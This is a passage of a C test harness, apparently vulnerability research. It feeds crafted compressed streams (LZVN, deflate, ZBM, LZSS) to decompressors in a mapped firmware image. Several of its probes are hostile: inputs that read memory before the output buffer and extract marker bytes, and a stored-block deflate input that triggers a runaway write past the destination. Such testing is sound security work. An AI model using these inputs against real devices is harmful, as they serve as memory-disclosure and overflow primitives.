      printf("POS-CONTIG delta=5000 span=60: faulted=%d produced=%zu contig_ok=%s bad@%d\n",
             r.faulted, produced, bad == -1 ? "YES" : "NO", bad);
    } else printf("POS-CONTIG: build fail wa=%ld hb=%ld\n", wa, hb);
  }
  /* --- S7: scattered extraction: 3 hostile blocks, deltas ~200k / ~1000 / ~40 --- */
  printf("== POS-SCATTER: 3 windows in ONE stream (deltas 200000, 1000, 40) ==\n");
  {
    u8 blk[24576];
    u32 Dw[4] = {4,5,4,5};
    long bl = 0;
    long wa = build_bvx1(blk, sizeof(blk), 4, 4, 4, Dw); bl += wa;      /* P=32 */
    const u32 ks[3] = {200000, 1000, 40};
    size_t p = 32; int allok = 1; size_t woff[3];
    for (int bi = 0; bi < 3; bi++) {
      long hb = pos_build(blk + bl, sizeof(blk) - bl, 15, 15, (u32)p + 15u + ks[bi]);
      if (hb < 0) { allok = 0; break; }
      bl += hb;
      woff[bi] = p + 15;   /* token0 match bytes start */
      p += 4 * (15 + 15);
    }
    wr32(blk + bl, 0x24787662); bl += 4;
    memset(dst.payload, 0x11, dst.cap);
    fill_apron(&dst);
    struct R r; GUARDED(g_direct(dst.payload, dst.cap, blk, bl, st.payload), r);
    size_t produced = r.faulted ? 0 : (size_t)(rd64(st.payload+0x28) - rd64(st.payload+0x18));
    for (int bi = 0; bi < 3 && !r.faulted; bi++) {
      int bad = -1;
      for (int n = 0; n < 15; n++)
        if (dst.payload[woff[bi] + n] != fmarker(ks[bi] - (u32)n)) { bad = n; break; }
      printf("POS-SCATTER win%d delta=%u out[%zu..%zu]: %s (bad@%d)\n",
             bi, ks[bi], woff[bi], woff[bi] + 14, bad == -1 ? "EXACT" : "MISMATCH", bad);
      if (bad != -1) allok = 0;
    }
    printf("POS-SCATTER summary: faulted=%d produced=%zu (want %zu) all=%d\n",
           r.faulted, produced, p, allok);
    if (r.faulted) printf("  FAULT pc=%llx addr=%llx sig=%d\n",
                          (unsigned long long)r.f.pc, (unsigned long long)r.f.addr, r.f.signo);
  }
  /* --- S8: word-granularity overread proof -----------------------------
   * Layout: [GUARD 512K][readable page P 16K][body 64K], dst_begin = P+4
   * (4-aligned as the staging decoder requires). Readable below begin:
   * exactly 4 bytes [P, P+4) = deltas 1..4. A BYTE-granular reader probing
   * delta=5 would touch P-1 (guard, fault @ begin-5); the copier's aligned
   * u32 load touches floor4(-5)*4 = -8 => fault ADDRESS begin-8. The fault
   * address itself is the granularity witness. --- */
  {
    size_t PG = 16384;
    size_t total = GUARD + PG + 65536;
    u8 *m = mmap(NULL, total, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
    mprotect(m, GUARD, PROT_NONE);
    u8 *P = m + GUARD;
    u8 *payload = P + 4;
    struct buf stw; mkbuf(&stw, 262144);
    printf("== POS-WORD: word-granularity proof (aligned begin=P+4, 4B readable apron) ==\n");
    P[0]=fmarker(4); P[1]=fmarker(3); P[2]=fmarker(2); P[3]=fmarker(1);
    memset(payload, 0x11, 65536);
    static u8 blk[24576];
    u32 Dw[4] = {4,5,4,5};
    long wa = build_bvx1(blk, sizeof(blk), 4, 4, 4, Dw);
    struct buf stw2; mkbuf(&stw2, 262144);
    /* control: delta=4 -> word[-4..-1] fully readable */
    {
      long hb = pos_build(blk + wa, sizeof(blk) - wa, 15, 15, 47 + 4);
      long bl = wa + hb;
      wr32(blk + bl, 0x24787662); bl += 4;
      struct R r; GUARDED(g_direct(payload, 65536, blk, bl, stw.payload), r);
      size_t pr = r.faulted ? 0 : (size_t)(rd64(stw.payload+0x28)-rd64(stw.payload+0x18));
      int ok = !r.faulted && pr >= 48 &&
               payload[47] == fmarker(4) && payload[48] == fmarker(3) &&
               payload[49] == fmarker(2) && payload[50] == fmarker(1);
      printf("POS-WORD ctrl delta=4 (word[-4..-1] inside): faulted=%d produced=%zu "
             "markers_ok=%d\n", r.faulted, pr, ok);
    }
    /* probe: delta=5 -> byte-granular would fault @begin-5; word-granular @begin-8 */
    {
      long hb = pos_build(blk + wa, sizeof(blk) - wa, 15, 15, 47 + 5);
      long bl = wa + hb;
      wr32(blk + bl, 0x24787662); bl += 4;
      struct R r; GUARDED(g_direct(payload, 65536, blk, bl, stw2.payload), r);
      printf("POS-WORD probe delta=5: faulted=%d", r.faulted);
      if (r.faulted)
        printf(" sig=%d addr_delta_vs_dstbegin=%+lld (byte-granular would be -5; "
               "word-granular floor4(-5)*4 = -8)", r.f.signo,
               (long long)((long long)r.f.addr - (long long)payload));
      printf("\n");
    }
    rmbuf(&stw); rmbuf(&stw2);
    munmap(m, total);
  }
  rmbuf(&dst); rmbuf(&scr); rmbuf(&st);
}

/* ===================== R1 helpers (file scope) ===================== */
struct rcap { long ret; int faulted, sig; u64 pc, addr; int fgn; size_t prod; u8 head[48]; size_t headn; u8 scr0[64]; };
static void r_show(const char *tag, const struct rcap *o) {
  printf("  %-34s ret=%ld f=%d", tag, o->ret, o->faulted);
  if (o->faulted) printf(" SIG=%d pc_off=%llx addr=%llx", o->sig,
                         (unsigned long long)o->pc, (unsigned long long)o->addr);
  else {
    printf(" prod=%zu fg=%d [", o->prod, o->fgn);
    for (size_t i = 0; i < o->headn && i < 12; i++) printf("%02x", o->head[i]);
    printf("]");
  }
  printf("\n");
}
u8 *r1_last_dst, *r1_last_src;
static u32 revbits(u32 v, int n) { u32 r = 0; for (int i = 0; i < n; i++) { r = (r << 1) | (v & 1); v >>= 1; } return r; }

int main(int argc, char **argv) {
  const char *mode = argc > 1 ? argv[1] : "val";
  setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0);
  fw_map();
  struct sigaction sa; memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = handler; sa.sa_flags = SA_SIGINFO;
  sigaction(SIGSEGV, &sa, NULL); sigaction(SIGBUS, &sa, NULL); sigaction(SIGILL, &sa, NULL);

  /* =================== MODE posk: pending-state probe =================== */
  if (!strcmp(mode, "posk")) {
    tb_init();
    struct buf dst, scr, st;
    mkbuf_lo(&dst, 65536, POS_LO);
    mkbuf(&scr, SCRATCH_SZ);
    mkbuf(&st, 262144);
    fill_apron(&dst);
    printf("== POSK: copier sub-state after warm + N literals (+optional match) ==\n");
    for (int NL = 0; NL <= 20; NL++) {
      /* warm block then a hostile-header block whose literal count = NL*? :
       * simplest: single bvx1 block T=4,L=NL,M=0? M=0 may be rejected.
       * Use T=4 L=NL M=4 D=47+k style but read state BEFORE matches by
       * choosing D so match sources stay IN-window (D small, benign). */
      u8 blk[4096];
      u32 Dw[4] = {4,5,4,5};
      long wa = build_bvx1(blk, sizeof(blk), 4, 4, 4, Dw);
      if (wa < 0) continue;
      u32 Dh[4] = {8,8,8,8};
      long hb = build_bvx1(blk + wa, sizeof(blk) - wa, 4, NL, 4, Dh);
      if (hb < 0) continue;
      long bl = wa + hb;
      wr32(blk + bl, 0x24787662); bl += 4;
      memset(dst.payload, 0x11, dst.cap);
      memset(st.payload, 0, 262144);
      struct R r; GUARDED(g_direct(dst.payload, dst.cap, blk, bl, st.payload), r);
      printf("POSK NL=%2d: faulted=%d produced=%3zu pend_word=%08x pend_cnt=%u\n",
             NL, r.faulted,
             r.faulted ? 0 : (size_t)(rd64(st.payload+0x28)-rd64(st.payload+0x18)),
             rd32(st.payload + 0x30), rd32(st.payload + 0x34));
    }
    /* and AFTER a full hostile leak cell: */
    {
      u8 blk[8192];
      u32 Dw[4] = {4,5,4,5};
      long wa = build_bvx1(blk, sizeof(blk), 4, 4, 4, Dw);
      long hb = pos_build(blk + wa, sizeof(blk) - wa, 15, 15, 47 + 1000);
      long bl = wa + hb;
      wr32(blk + bl, 0x24787662); bl += 4;
      memset(st.payload, 0, 262144);
      struct R r; GUARDED(g_direct(dst.payload, dst.cap, blk, bl, st.payload), r);
      printf("POSK leak-cell(L15,M15,D1047): faulted=%d produced=%zu pend_cnt=%u\n",
             r.faulted,
             r.faulted ? 0 : (size_t)(rd64(st.payload+0x28)-rd64(st.payload+0x18)),
             rd32(st.payload + 0x34));
    }
    rmbuf(&dst); rmbuf(&scr); rmbuf(&st);
    return 0;
  }

  /* =================== MODE pos: MISSION 1 positional sweep =================== */
  if (!strcmp(mode, "pos")) { pos_mode(); return 0; }

  /* =================== MODE r1: unaudited dispatcher ids (0x100/101/205/505/600/602/700/702/900/901) ===== */
  if (!strcmp(mode, "r1")) {
    printf("== R1: unaudited-id live sweep (dispatcher FUN_001eb3c8) ==\n");
    static const struct { u32 id; size_t scr; const char *name; } RID[] = {
      {0x100, 0,       "bv4-container(LZVN)"},
      {0x101, 0,       "raw-LZVN"},
      {0x205, 0x20090, "deflate"},
      {0x505, 0x20090, "deflate+zlibhdr"},
      {0x600, 0,       "group-token"},
      {0x602, 0,       "group-token"},
      {0x700, 0x2080,  "ZBM"},
      {0x702, 0x2080,  "ZBM"},
      {0x900, 0,       "byte-LZSS"},
      {0x901, 0,       "byte-LZSS"},
    };

    /* ---- shared cell runner ---- */
    struct dbw { u8 *b; size_t cap, nb; u32 acc; int nbits; };
    #define DW_PUT(w_, v_, n_) do { (w_).acc |= ((u32)(v_) & ((1u<<(n_))-1)) << (w_).nbits; \
      (w_).nbits += (n_); while ((w_).nbits >= 8) { if ((w_).nb < (w_).cap) (w_).b[(w_).nb] = (u8)(w_).acc; \
      (w_).nb++; (w_).acc >>= 8; (w_).nbits -= 8; } } while (0)
    #define DW_FLUSH(w_) do { if ((w_).nbits) { if ((w_).nb < (w_).cap) (w_).b[(w_).nb]=(u8)(w_).acc; (w_).nb++; } \
      (w_).acc = 0; (w_).nbits = 0; } while (0)
    /* run one id cell; fill 0x11; marker aprons both buffers */
    #define R_GO(id_, src_, sn_, dcap_, scrsz_, out_) do { \
      static u8 *g_last_dst, *g_last_src; extern u8 *r1_last_dst, *r1_last_src; (void)g_last_dst; (void)g_last_src; \
      struct buf d_, s_; struct R rr_; memset((out_), 0, sizeof(*(out_))); \
      mkbuf(&d_, (dcap_)); mkbuf(&s_, (scrsz_) ? (scrsz_) : 64); \
      r1_last_dst = d_.payload; r1_last_src = s_.payload; \
      memset(d_.payload, 0x11, (dcap_)); \
      GUARDED(g_disp(d_.payload, (dcap_), (src_), (sn_), s_.payload, (id_)), rr_); \
      (out_)->ret = rr_.ret; (out_)->faulted = rr_.faulted; \
      if (rr_.faulted) { (out_)->sig = rr_.f.signo; (out_)->pc = rr_.f.pc - (u64)g_fw; (out_)->addr = rr_.f.addr; } \
      else { \
        for (size_t i_ = 0; i_ < d_.lo_sz; i_++) if (d_.lo[i_] != 0xA5) { (out_)->fgn |= 1; break; } \
        for (size_t i_ = 0; i_ < d_.hi_sz; i_++) if (d_.hi[i_] != 0x5A) { (out_)->fgn |= 2; break; } \
        for (size_t i_ = 0; i_ < s_.lo_sz; i_++) if (s_.lo[i_] != 0xA5) { (out_)->fgn |= 4; break; } \
        for (size_t i_ = 0; i_ < s_.hi_sz; i_++) if (s_.hi[i_] != 0x5A) { (out_)->fgn |= 8; break; } \
        long pr_ = rr_.ret; \
        if (pr_ <= 0 || pr_ > (long)(dcap_)) { \
          pr_ = 0; while (pr_ < (long)(dcap_) && d_.payload[pr_] != 0x11) pr_++; } \
        (out_)->prod = (size_t)(pr_ > 0 ? pr_ : 0); \
        (out_)->headn = (out_)->prod < sizeof((out_))->head ? (out_)->prod : sizeof((out_))->head; \
        memcpy((out_)->head, d_.payload, (out_)->headn); \
      } \
      memcpy((out_)->scr0, s_.payload, sizeof((out_)->scr0)); \
      rmbuf(&d_); rmbuf(&s_); \
    } while (0)

    struct rcap O;
    u8 S[8192];

    /* ---------- A. LZVN benign: harvest 'bvxn' payload from real LZFSE stream ---------- */
    printf("-- A. benign anchors --\n");
    u8 *lzvn_pay = NULL; size_t lzvn_n = 0; size_t lzvn_out = 0; u8 *lzvn_ref = NULL;
    {
      u8 pt[40000];
      for (size_t i = 0; i < sizeof(pt); i++) pt[i] = (u8)("DIRTYSLIDE-lzvn-anchor-"[i % 23] + (i >> 9));
      u8 enc[42000];
      size_t enclen = compression_encode_buffer(enc, sizeof(enc), pt, sizeof(pt), NULL, COMPRESSION_LZFSE);
      printf("  [anchor] lzfse encode: %zu -> %zu\n", sizeof(pt), enclen);
      for (size_t p = 0; p + 8 < enclen; ) {
        u32 m = rd32(enc + p);
        if (m == 0x24787662) break;                       /* bvx$ */
        if (m == 0x2d787662) { p += 8 + rd32(enc + p + 4); continue; }   /* bvx- */
        if (m == 0x6e787662) {                            /* bvxn */
          lzvn_out = rd32(enc + p + 4);
          /* find payload end: scan forward for next magic */
          size_t q = p + 8; const u8 *magics[4] = {};
          (void)magics;
          while (q + 4 < enclen) { u32 m2 = rd32(enc + q);
            if (m2 == 0x24787662 || m2 == 0x2d787662 || m2 == 0x6e787662 || m2 == 0x31787662) break;
            q++; }
          lzvn_n = q - (p + 8);
          lzvn_pay = malloc(lzvn_n); memcpy(lzvn_pay, enc + p + 8, lzvn_n);
          lzvn_ref = malloc(lzvn_out);
          /* reference plaintext slice: walk prior blocks' outputs */
          size_t outpos = 0; size_t pp = 0;
          while (pp < p) {
            u32 mm = rd32(enc + pp);
            if (mm == 0x2d787662) { u32 n = rd32(enc + pp + 4); pp += 8 + n; }
            else if (mm == 0x6e787662) {
              u32 n = rd32(enc + pp + 4);
              size_t qq = pp + 8; while (qq + 4 < enclen) { u32 x = rd32(enc + qq);
                if (x==0x24787662||x==0x2d787662||x==0x6e787662||x==0x31787662) break; qq++; }
              (void)n; outpos += n; pp = qq;
            } else break;
          }
          memcpy(lzvn_ref, pt + (outpos <= sizeof(pt) ? outpos : 0), lzvn_out);
          printf("  [anchor] bvxn@%zu out=%zu pay=%zu\n", p, lzvn_out, lzvn_n);
          break;
        }
        p++;   /* unknown block (bvx1/bvx2) - slide */
      }
    }

    /* A1: id 0x101 raw-LZVN benign roundtrip */
    if (lzvn_pay) {
      R_GO(0x101, lzvn_pay, lzvn_n, lzvn_out + 64, 64, &O);
      int ok = !O.faulted && O.prod == lzvn_out && !memcmp(O.head, lzvn_ref, O.headn < lzvn_out ? O.headn : lzvn_out);
      r_show("A1 0x101 benign lzvn payload", &O);
      printf("     model-match=%d\n", ok ? 1 : 0);
      /* A2: id 0x100 'bv41' container around same payload */
      size_t cn = 12 + lzvn_n + 4;
      u8 *ct = malloc(cn);
      wr32(ct + 0, 0x31347662);            /* 'bv41' */
      wr32(ct + 4, (u32)lzvn_out);
      wr32(ct + 8, (u32)lzvn_n);
      memcpy(ct + 12, lzvn_pay, lzvn_n);
      wr32(ct + 12 + lzvn_n, 0x24347662);  /* 'bv4$' */
      R_GO(0x100, ct, cn, lzvn_out + 64, 64, &O);
      r_show("A2 0x100 bv41{payload}+bv4$", &O);
      free(ct);
      /* A3: 0x100 raw block 'bv4-' */
      u8 rb[64]; u32 rn = 20;
      wr32(rb + 0, 0x2d347662); wr32(rb + 4, rn);
      for (u32 i = 0; i < rn; i++) rb[8 + i] = (u8)('a' + i);
      wr32(rb + 28, 0x24347662);
      R_GO(0x100, rb, 32, 64, 64, &O);
      r_show("A3 0x100 bv4- raw 20B", &O);
      /* A4: 0x100 mixed: raw + bv41 */
      size_t mn = 8 + rn + cn;
      u8 *mt = malloc(mn); memcpy(mt, rb, 8 + rn); memcpy(mt + 8 + rn, ct, cn);
      R_GO(0x100, mt, mn, lzvn_out + rn + 64, 64, &O);
      r_show("A4 0x100 raw+bv41 mixed", &O);
      free(mt);
    } else printf("  [anchor] no bvxn block found - A1/A2 skipped\n");

    /* A5: deflate/zlib benign via COMPRESSION_ZLIB */
    {
      u8 pt[30000]; for (size_t i = 0; i < sizeof(pt); i++) pt[i] = (u8)((i * 31 + (i >> 7)) & 0xFF);
      u8 zc[32000];
      size_t zn = compression_encode_buffer(zc, sizeof(zc), pt, sizeof(pt), NULL, COMPRESSION_ZLIB);
      printf("  [anchor] zlib encode: %zu -> %zu (hdr %02x %02x)\n", sizeof(pt), zn, zc[0], zc[1]);
      R_GO(0x505, zc, zn, sizeof(pt) + 128, 0x20090, &O);
      int ok = !O.faulted && O.prod == sizeof(pt) && !memcmp(O.head, pt, O.headn);
      r_show("A5 0x505 benign zlib", &O);
      printf("     model-match=%d\n", ok ? 1 : 0);
      R_GO(0x205, zc, zn, sizeof(pt) + 128, 0x20090, &O);
      ok = !O.faulted && O.prod == sizeof(pt) && !memcmp(O.head, pt, O.headn);
      r_show("A6 0x205 same stream", &O);
      printf("     model-match=%d\n", ok ? 1 : 0);
      /* A7 raw deflate stripped (no zlib hdr) */
      R_GO(0x205, zc + 2, zn - 6, sizeof(pt) + 128, 0x20090, &O);
      r_show("A7 0x205 raw-deflate(no hdr)", &O);
    }

    /* A8: 0x600 group-token benign: N groups of 8 literals + terminator FF FF 00 00 00 */
    {
      size_t NG = 16; size_t sn = NG * 12 + 5;
      u8 *st = malloc(sn); size_t p = 0;
      for (size_t g = 0; g < NG; g++) {
        wr32(st + p, 0x000000FF); p += 4;
        for (int k = 0; k < 8; k++) st[p++] = (u8)('A' + ((g * 8 + k) & 0xF));
      }
      st[p++] = 0xFF; st[p++] = 0xFF; st[p++] = 0; st[p++] = 0; st[p++] = 0;
      R_GO(0x600, st, sn, NG * 8, 64, &O);
      int ok = !O.faulted && O.prod == NG * 8;
      r_show("A8 0x600 16x8-lit groups", &O);
      printf("     expect '%c%c%c...' match=%d\n", 'A', 'A' + 1, 'A' + 2, ok ? 1 : 0);
      /* A9: FFFF uncompressed-run token: [FF FF][len u16][00][data] */
      u8 rt[5 + 24];
      rt[0] = 0xFF; rt[1] = 0xFF; wr16(rt + 2, 24); rt[4] = 0;
      for (int i = 0; i < 24; i++) rt[5 + i] = (u8)(0xE0 + i);
      R_GO(0x602, rt, sizeof(rt), 24, 64, &O);
      r_show("A9 0x602 FFFF-run 24B", &O);
      free(st);
    }

    /* A10: ZBM uncompressed-block benign: 'ZBM' flags=8 [lenA=lenB+6][lenB][raw] */
    {
      u32 NB = 0x100;
      u8 *zt = malloc(4 + 6 + NB + 16);
      zt[0]='Z'; zt[1]='B'; zt[2]='M'; zt[3]=0x08;
      u32 la_ = NB + 6;
      zt[4]=(u8)la_; zt[5]=(u8)(la_>>8); zt[6]=(u8)(la_>>16);     /* lenA @+4 lo24 */
      zt[7]=(u8)NB; zt[8]=(u8)(NB>>8); zt[9]=(u8)(NB>>16);        /* lenB @+7 lo24 */
      for (u32 i = 0; i < NB; i++) zt[10 + i] = (u8)('0' + (i & 7));
      R_GO(0x700, zt, 10 + NB, NB, 0x2080, &O);
      int ok = !O.faulted && O.prod == NB;
      r_show("A10 0x700 ZBM uncompr blk 256B", &O);
      printf("     model-match=%d\n", ok ? 1 : 0);
      free(zt);
    }

    /* A11: 0x900 byte-LZSS benign: E5 'Hello' 06 (+pad to srclen>=8) */
    {
      u8 bt[16] = { 0xE5,'H','e','l','l','o', 0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06 };
      R_GO(0x900, bt, sizeof(bt), 64, 64, &O);
      int ok = !O.faulted && O.prod == 5 && O.head[0]=='H';
      r_show("A11 0x900 E5-lit5 + 06 end", &O);
      printf("     model-match=%d\n", ok ? 1 : 0);
      R_GO(0x901, bt, sizeof(bt), 64, 64, &O);
      r_show("A12 0x901 same", &O);
      /* A13: default-family token attempt: after 'ABC' emit Q for D=3 M>=3 (brute over Q) */
      int found = -1;
      for (u32 qi = 0; qi < 4096 && found < 0; qi++) {
        u32 Q = qi << 6;                     /* explore bits 6..17 */
        u8 t[24]; memset(t, 0xCC, sizeof(t));
        t[0] = 0xE3; t[1] = 'A'; t[2] = 'B'; t[3] = 'C';
        t[4] = 0x00;                          /* op byte (default family) */
        wr32(t + 5, Q);                       /* Q low 4 bytes; rest 0xCC */
        t[13] = 0x06;
        struct rcap T; R_GO(0x900, t, 14, 64, 64, &T);
        if (!T.faulted && T.prod == 6 && T.head[3]=='A' && T.head[4]=='B' && T.head[5]=='C') found = (int)Q;
      }
      if (found >= 0) printf("  A13 0x900 default-family Q=%#x decodes ABC->ABCABC\n", found);
      else           printf("  A13 0x900 default-family Q-scan: no ABCABC hit (semantics differ)\n");
    }

    /* A14/A15: hand-built LZVN benign + micro-hostile */
    {
      u8 lz[64]; memset(lz, 0xCC, sizeof lz);
      /* op 0x33: L=3 lits ABC ; M=7 ; D=3 -> ABCABCABCABC(10B) */
      size_t p = 0;
      lz[p++] = 0x33; lz[p++] = 'A'; lz[p++] = 'B'; lz[p++] = 'C';
      lz[p++] = 0x03; lz[p++] = 0x00;
      R_GO(0x101, lz, 6, 64, 64, &O);
      int ok = !O.faulted && O.prod == 10 && !memcmp(O.head, "ABCABCABCAB", O.prod);
      r_show("A14 0x101 hand lzvn ABC+M7D3", &O);
      printf("     model-match=%d\n", ok ? 1 : 0);
      /* wrap in bv41 container for 0x100 */
      u8 ct2[32];
      wr32(ct2 + 0, 0x31347662); wr32(ct2 + 4, 10); wr32(ct2 + 8, 6);
      memcpy(ct2 + 12, lz, 6); wr32(ct2 + 18, 0x24347662);
      R_GO(0x100, ct2, 22, 64, 64, &O);
      ok = !O.faulted && O.prod == 10;
      r_show("A15 0x100 bv41{hand-lzvn}", &O);
      printf("     model-match=%d\n", ok ? 1 : 0);
      /* hostile: D > produced (underflow read probe) */
      u8 hb_[16]; memset(hb_, 0xCC, sizeof hb_);
      hb_[0] = 0x31; hb_[1] = 'Z'; hb_[2] = 0x09; hb_[3] = 0x00;   /* L=3 M=5 D=9 > 3 */
      R_GO(0x101, hb_, 12, 64, 64, &O);
      r_show("B0a 0x101 D>out", &O);
      /* hostile: D = 0 */
      hb_[2] = 0x00; hb_[3] = 0x00;
      R_GO(0x101, hb_, 12, 64, 64, &O);
      r_show("B0b 0x101 D=0", &O);
      /* hostile: M-ext chain truncated */
      u8 hx[8]; memset(hx, 0xCC, sizeof hx);
      hx[0] = 0x0F; hx[1] = 'A';    /* L=15 needs ext chain; only 1 byte present */
      R_GO(0x101, hx, 2, 64, 64, &O);
      r_show("B0c 0x101 L15-trunc", &O);
      /* hostile: tiny dst crossing soft-end (overshoot probes) */
      for (size_t dc2 = 0x80; dc2 <= 0xA0; dc2 += 8) {
        R_GO(0x101, lzvn_pay ? lzvn_pay : lz, lzvn_pay ? lzvn_n : 6, dc2, 64, &O);
        if (O.faulted || O.fgn) { char tg[40]; snprintf(tg, sizeof tg, "B0d softend dcap%zu", dc2); r_show(tg, &O); }
      }
      printf("  B0d soft-end overshoot sweep done (only anomalies shown)\n");
    }

    /* A16: 0x600 NEON-path engagement: 60 FFFF-runs = 1440B output vs dstcap 1536 */
    {
      size_t RN = 60; size_t sn2 = RN * (5 + 24) + 5;
      u8 *rt2 = malloc(sn2); size_t q = 0;
      for (size_t g = 0; g < RN; g++) {
        rt2[q++] = 0xFF; rt2[q++] = 0xFF; wr16(rt2 + q, 24); q += 2; rt2[q++] = 0;
        for (int k = 0; k < 24; k++) rt2[q++] = (u8)('0' + ((g + k) & 7));
      }
      rt2[q++] = 0xFF; rt2[q++] = 0xFF; rt2[q++] = 0; rt2[q++] = 0; rt2[q++] = 0;
      R_GO(0x600, rt2, sn2, 1536, 64, &O);
      r_show("A16 0x600 60-run NEON engage", &O);
      free(rt2);
    }

    /* ---------- B. hostile batteries ---------- */
    printf("-- B. hostile --\n");
    if (lzvn_pay) {
      /* B1: LZVN truncated mid-stream (input overread probe) */
      for (size_t cut = 1; cut <= 6; cut++) {
        R_GO(0x101, lzvn_pay, lzvn_n - cut, lzvn_out + 64, 64, &O);
        r_show("B1 0x101 trunc-tail", &O);
      }
      /* B2: LZVN dst smaller than logical output (overrun probe) */
      for (size_t dc = 4; dc <= 0x84; dc += (dc < 0x40 ? 4 : 0x21)) {
        R_GO(0x101, lzvn_pay, lzvn_n, dc, 64, &O);
        if (O.faulted || O.fgn) r_show("B2 0x101 small-dst", &O);
      }
      printf("  B2 0x101 small-dst sweep done (only fault/foreign shown)\n");
      /* B3: op-byte fuzz: random op streams */
      unsigned seed = 0x12345; int bad = 0;
      for (int it = 0; it < 400; it++) {
        seed = seed * 1103515245 + 12345;
        size_t sn = 3 + (seed >> 16) % 64;
        for (size_t i = 0; i < sn; i++) { seed = seed * 1103515245 + 12345; S[i] = (u8)(seed >> 16); }
        R_GO(0x101, S, sn, 256, 64, &O);
        if (O.faulted || O.fgn) { char tg[64]; snprintf(tg, sizeof tg, "B3 fz%d sn=%zu", it, sn);
                                  r_show(tg, &O); bad++; if (bad > 6) break; }
      }
      printf("  B3 0x101 rand-op fuzz x400: anomalies=%d\n", bad);
    }

    /* B4: deflate hostile (0x205 = RAW deflate proven by A6; 0x505 = zlib wrapper) */
    {
      u8 db[256];
      /* stored-block minimization battery */
      struct dbw w; memset(&w, 0, sizeof w); w.b = db; w.cap = sizeof db;
      DW_PUT(w, 1, 1); DW_PUT(w, 0, 2); DW_FLUSH(w);
      wr16(db + w.nb, 0xFFFF); wr16(db + w.nb + 2, 0xFFFF); w.nb += 4;
      memset(db + w.nb, 0x5A, 32); w.nb += 32;
      printf("  [B4a] src=%p n=%zu\n", (void*)db, w.nb);
      R_GO(0x205, db, w.nb, 16, 0x20090, &O);
      r_show("B4a stored LEN=FFFF dst16", &O);
      if (O.faulted) {
        printf("     dst@%p delta-dst=%lld  scr:", (void*)r1_last_dst,
               (long long)((long long)O.addr - (long long)r1_last_dst));
        for (int q = 0; q < 8; q++) { u64 v; memcpy(&v, O.scr0 + q*8, 8); printf(" %llx", (unsigned long long)v); }
        printf("\n");
      }
      {
        /* LEN bisect: find fault boundary */
        for (u32 LN = 0x20; ; LN = (LN == 0x20 ? 0x21 : LN * 2)) {
          memset(&w, 0, sizeof w); w.b = db; w.cap = sizeof db;
          DW_PUT(w, 1, 1); DW_PUT(w, 0, 2); DW_FLUSH(w);
          wr16(db + w.nb, (u16)LN); wr16(db + w.nb + 2, (u16)(~LN & 0xFFFF)); w.nb += 4;
          memset(db + w.nb, 0x5A, 32); w.nb += 32;
          R_GO(0x205, db, w.nb, 4096, 0x20090, &O);
          int anom = O.faulted || O.fgn || (O.prod != LN && !O.faulted);
          if (anom || LN == 0x100000) {
            char tg[64]; snprintf(tg, sizeof tg, "B4m-lenbisect LEN=%#X", LN);
            r_show(tg, &O);
            if (O.faulted) printf("     delta-src=%lld\n", (long long)((long long)O.addr - (long long)db));
            if (!anom) break;
          }
          if (LN > 0x80000) break;
        }
        /* dstcap bisect at LEN=FFFF */
        for (size_t dc = 4; dc <= 70000; dc = dc * 2) {
          memset(&w, 0, sizeof w); w.b = db; w.cap = sizeof db;
          DW_PUT(w, 1, 1); DW_PUT(w, 0, 2); DW_FLUSH(w);
          wr16(db + w.nb, 0xFFFF); wr16(db + w.nb + 2, 0xFFFF); w.nb += 4;
          memset(db + w.nb, 0x5A, 32); w.nb += 32;
          R_GO(0x205, db, w.nb, dc, 0x20090, &O);
          if (O.faulted || O.fgn) {
            char tg[64]; snprintf(tg, sizeof tg, "B4m-dstbisect dst=%zu", dc);
            r_show(tg, &O);
            if (O.faulted) printf("     delta-src=%lld\n", (long long)((long long)O.addr - (long long)db));
            break;
          }
        }
        printf("  B4m stored-block matrix done (only anomalies shown)\n");
      }
      /* B4w: WRITE-SIDE EVIDENCE for the stored-block runaway copy:
       * keep buffers alive on fault, diff aprons + payload to see how far
       * attacker bytes (0x5A pattern) advanced past dst. */
      {
        struct buf d_, s_; struct R rr_;
        size_t dcap = 16;
        mkbuf(&d_, dcap); mkbuf(&s_, 0x20090);
        memset(d_.payload, 0x11, dcap);
        u8 sb[64]; memset(sb, 0xCC, sizeof sb);
        /* BFINAL=1 BTYPE=00 | LEN=FFFF NLEN=FFFF | 32B body 0x5A ; dst TOO SMALL */
        sb[0] = 0x01; sb[1] = 0xFF; sb[2] = 0xFF; sb[3] = 0xFF; sb[4] = 0xFF;
        memset(sb + 5, 0x5A, 32);
        r1_last_dst = d_.payload;
        GUARDED(g_disp(d_.payload, dcap, sb, 37, s_.payload, 0x205), rr_);
        printf("  B4w 0x205 runaway-write probe: faulted=%d", rr_.faulted);
        if (rr_.faulted) {
          long woff = (long long)rr_.f.addr - (long long)d_.payload;
          printf(" sig=%d addr-vs-dst=%+lld", rr_.f.signo, (long long)((long long)rr_.f.addr - (long long)d_.payload));
          /* scan dst region forward for the 0x5A body marker */
          long first5a = -1, last5a = -1;
          for (long k = 0; k < (long)(dcap + 65536); k++) {
            if (d_.payload[k] == 0x5A) { if (first5a < 0) first5a = k; last5a = k; }
          }
          printf(" 5A-span=[%ld..%ld)", first5a, last5a + 1);
          int lohit = 0; for (size_t k2 = 0; k2 < d_.lo_sz; k2++) if (d_.lo[k2] != 0xA5) { lohit = 1; break; }
          int hihit = 0; for (size_t k2 = 0; k2 < d_.hi_sz; k2++) if (d_.hi[k2] != 0x5A) { hihit = 1; break; }
          printf(" loApronDirty=%d hiApronDirty=%d\n", lohit, hihit);
        } else {
          printf(" ret=%ld (NO FAULT this config)\n", rr_.ret);
        }
        rmbuf(&d_); rmbuf(&s_);
      }
      /* B4z: determinism characterization of the runaway-copy trigger */
      {
        for (int shift = 0; shift < 2; shift++) {
          for (size_t dcap2 = 4; dcap2 <= 64; dcap2 = dcap2 * 2) {
            struct buf d_, s_; struct R rr_;
            mkbuf(&d_, dcap2); mkbuf(&s_, 0x20090);
            memset(d_.payload, 0x11, dcap2);
            u8 *sbx = malloc(128);
            memset(sbx, 0xCC, 128);
            sbx[shift + 0] = 0x01;
            sbx[shift + 1] = 0xFF; sbx[shift + 2] = 0xFF; sbx[shift + 3] = 0xFF; sbx[shift + 4] = 0xFF;
            memset(sbx + shift + 5, 0x5A, 32);
            GUARDED(g_disp(d_.payload, dcap2, sbx + shift, 37, s_.payload, 0x205), rr_);
            int fr_ = 0;
